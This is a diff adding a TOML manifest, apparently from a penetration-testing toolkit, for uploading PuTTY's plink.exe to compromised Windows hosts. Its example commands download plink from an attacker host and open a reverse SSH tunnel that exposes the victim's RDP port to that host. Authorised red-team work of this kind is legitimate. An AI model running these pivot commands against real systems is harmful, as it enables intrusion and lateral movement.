@@ -1,0 +1,21 @@
+schema = 1
+kind = "upload"
+description = "PuTTY's command-line SSH client for Windows, for port forwards from a pivot back to Kali"
+tags = ["windows", "pivot", "tunnel", "ssh"]
+upstream = "https://www.chiark.greenend.org.uk/~sgtatham/putty/"
+licence = "MIT"
+arch = "x86_64"
+examples = [
+  "iwr http://{lhost}/plink.exe -OutFile plink.exe",
+  "cmd.exe /c echo y | .\\plink.exe -ssh -l user -pw password -N -R 127.0.0.1:3389:127.0.0.1:3389 {lhost}",
+]
+
+[[upload]]
+path = "files/w64/plink.exe"
+as = "plink.exe"
+note = "64-bit Windows"
+
+[[upload]]
+path = "files/w32/plink.exe"
+as = "plink32.exe"
+note = "32-bit Windows"
